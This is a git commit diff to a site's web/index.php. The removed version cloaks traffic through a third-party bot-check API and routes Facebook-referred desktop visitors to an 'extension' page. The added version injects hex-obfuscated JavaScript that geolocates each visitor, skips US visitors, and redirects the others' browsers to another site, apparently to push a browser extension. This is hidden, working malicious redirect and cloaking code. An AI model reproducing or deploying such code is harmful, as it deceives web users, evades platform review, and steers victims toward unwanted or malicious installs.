9870e04b0da64c0b5533fd6a07e4b1d55f4bee7b
sanernecro <sanernecro@gmail.com>
2016-11-03 00:28:05 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,68 +1,59 @@
 <?php
-
-require_once("config.php");
-require_once("functions.php");
-
-function getIpAddress() {
-    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipAddresses = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        return trim(end($ipAddresses));
+  function md5rand($val){
+  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+      $chars="0123456789";
+      srand((double)microtime()*1000000);
+      $i = 0;
+      $pass = '' ;
+      while ($i<=$val) 
+    {
+        $num  = rand() % 10;
+        $tmp  = substr($chars, $num, 1);
+        $pass = $pass . $tmp;
+        $i++;
+      }
+    return $pass;
     }
-    else {
-        return $_SERVER['REMOTE_ADDR'];
+      function shkronja($val){
+  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+      srand((double)microtime()*1000000);
+      $i = 0;
+      $pass = '' ;
+      while ($i<=$val)
+    {
+        $num  = rand() % 10;
+        $tmp  = substr($chars, $num, 1);
+        $pass = $pass . $tmp;
+        $i++;
+      }
+    return $pass;
     }
-}
-
-$ch = curl_init();
-curl_setopt_array($ch, array(
-    CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://tracking.redirect.pub/api/isBot?api_key=51fa5653d1986420acfc567f4a9826ac&i='.getIpAddress().'&u='.$_SERVER["HTTP_USER_AGENT"]
-));
-$api = curl_exec($ch);
-curl_close($ch);
-$isref = false;
 
 
-$data = json_decode($api);
 
-$theme = "none";
-$mobile = "https://goo.gl/TdR8a3";
+    ?>
+        <meta property="og:title" content="abc" />
+<?php
 
-if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
-    $isref = true;
-}
-if (strpos($_SERVER["HTTP_REFERER"], 'herokuapp.com') !== false){
-    $isref = true;
-}
+{
+$randval = rand();
+if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {
+  
 
-if ($data->status == "true" && $data->device_type == "desktop" && $isref == true) {
+  if (strpos($_SERVER["REQUEST_URI"], 'sanx1') !== false){
+  echo ' <script>
 
-  $theme = "extension";
+var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","http://'.$app_site.'/","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999) + "sanx0"; }  </script>';
 
 }
+    } else {
 
-if ($data->status == "true" && $data->device_type == "mobile") {
+        require_once('extension.php');
+    }
 
-  $theme = "mobile";
 
-}
 
-if ($theme == "extension") {
+ob_end_flush();
 
-  if(strpos($_SERVER["HTTP_HOST"], $app_site) === false){
-    header("Location: http://".$app_site."/".rand(1000000, 999999999));
-  } else {
-    require_once('extension.php');
-  }
-  exit;
-
-} else if ($theme == "mobile") {
-
-  header("Location: ".$mobile);
-  exit;
-
-} else {
-
-  require_once('share.php');
-  exit;
-}
+?>
